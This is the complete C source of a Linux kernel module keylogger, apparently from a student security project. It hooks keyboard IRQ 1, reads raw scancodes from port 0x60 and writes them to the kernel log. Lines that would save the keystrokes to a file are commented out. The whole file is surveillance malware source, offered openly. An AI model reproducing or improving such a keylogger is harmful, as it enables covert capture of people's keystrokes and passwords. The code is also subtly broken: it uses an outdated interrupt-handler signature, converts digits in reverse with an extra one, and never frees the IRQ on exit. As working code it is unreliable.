/** keylogger.c
 *
 *	Create an interrupt handler to log all keys pressed on keyboard
 */

#include <linux/module.h>
#include <linux/ptrace.h>
#include <linux/signal.h>
#include <linux/sched.h>
#include <linux/interrupt.h>

#define KEYBOARD_IRQ 1
#define KBD_STATUS_REG			0x64
#define KBD_CTL_REG				0x64
#define KBD_DATA_REG			0x60

#define kbd_read_input()		inb(KBD_DATA_REG)
#define kbd_read_status()		inb(KBD_STATUS_REG)
#define kbd_write_output(val)	outb(val, KBD_DATA_REG)
#define kbd_write_command(val)	outb(val, KBD_CTL_REG)

static int keylogger_init(void);
static void keylogger_exit(void);

void my_keyboard_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
	int scancode = kbd_read_input();
	int cp = scancode;
	int power = 0;
	int key_status = kbd_read_status();
	char buff[15];
	int i = 0, n;

/*	int fd = open("/home/user1/securite/projet/keylogger/keylog.log", O_WRONLY, O_CREAT | O_APPEND);
*/

	while (cp > 0)
	{
		cp /= 10;
		power++;
	}

	while (power >= 0)
	{
		buff[i++] = (scancode % 10) + '0';
		power--;
		scancode /= 10;
	}

	buff[i++] = '\n';
	buff[i] = '\0';

/*	n = write(fd, buff, i);
*/
	printk(KERN_INFO "%s\n", buff);
}

static int keylogger_init()
{
	int n = request_irq(KEYBOARD_IRQ, my_keyboard_irq_handler, 0, "my_keyboard", 0);
	printk(KERN_INFO "Starting keylogger (%i)...\n", n);

	return 0;
}

static void keylogger_exit()
{
	printk(KERN_INFO "Exiting keylogger...\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");

